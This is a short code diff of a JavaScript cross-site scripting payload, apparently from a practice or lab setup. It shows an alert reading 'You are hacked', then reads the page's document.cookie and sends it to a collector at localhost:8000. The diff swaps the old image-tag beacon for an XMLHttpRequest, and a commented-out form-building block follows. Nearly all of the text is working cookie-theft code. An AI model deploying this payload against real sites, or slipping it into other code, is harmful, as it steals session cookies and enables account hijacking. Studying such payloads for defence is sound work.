@@ -1,8 +1,10 @@
 alert('You are hacked - xss2!');
 
-cookie = document.cookie;
-
-document.write("<img src='http://localhost:8000?cookie=" + cookie + "' />");
+var sessionCookie = document.cookie;
+console.log('sessionCookie: ' + sessionCookie);
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://localhost:8000?cookie=" + sessionCookie, true);
+xhr.send();
 /*
 var form = document.createElement('form');
 form.setAttribute('method', 'post');
